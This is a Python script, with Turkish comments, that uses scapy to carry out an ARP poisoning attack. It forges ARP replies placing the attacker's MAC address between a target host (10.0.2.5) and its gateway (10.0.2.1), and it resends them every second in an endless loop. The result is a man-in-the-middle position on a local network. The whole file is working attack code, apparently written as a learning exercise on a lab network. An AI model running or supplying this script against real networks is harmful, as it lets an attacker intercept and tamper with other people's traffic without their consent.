from scapy.all import*
import subprocess

hedef_ip="10.0.2.5"
gateway_ip="10.0.2.1"

ifconfigResult =subprocess.check_output("ifconfig eth0", shell=True).decode() 
attacker_mac= re.search("ether (.*?)txqueuelen",ifconfigResult).group(1).strip() 

eth=Ether(src=attacker_mac)
h_arp=ARP(hwsrc=attacker_mac,psrc=gateway_ip,pdst=hedef_ip) # h_arp paketinin amacı hedef ip nin olduğu yere paket taşırken psrc si kendi gatewayden değilde hwsrc yani attack_mac den yollanır
g_arp=ARP(hwsrc=attacker_mac,psrc=hedef_ip,pdst=gateway_ip) # yukarıdaki işlemin hedeften gatewaye paket göndermesi şeklinde düşünebiliriz

# bu saldırı paket sayısı bitince bitecek bundan dolayı while ile sonsuz döngüye alalım
#for i in range(10): 
#	sendp(eth/h_arp) # eth ve h_arp paketlerimizi gönderelim
#	sendp(eth/g_arp) # eth ve g_arp paketleri olarak gönderelim
print("Arp poising attack is starting")
# sonsüz döngü için
while True:
	try:
		sendp(eth/h_arp) # eth ve h_arp paketlerimizi gönderelim
		sendp(eth/g_arp) # eth ve g_arp paketleri olarak gönderelim
	except KeyboardInterrupt: # istediğim zaman yani ctrl+c yaptığım zaman döngü dursun demek
		print("Arp poising is stopped")
		break
	time.sleep(1) # sürekli göndermesin 1 saniyede bir kere göndersin
		
	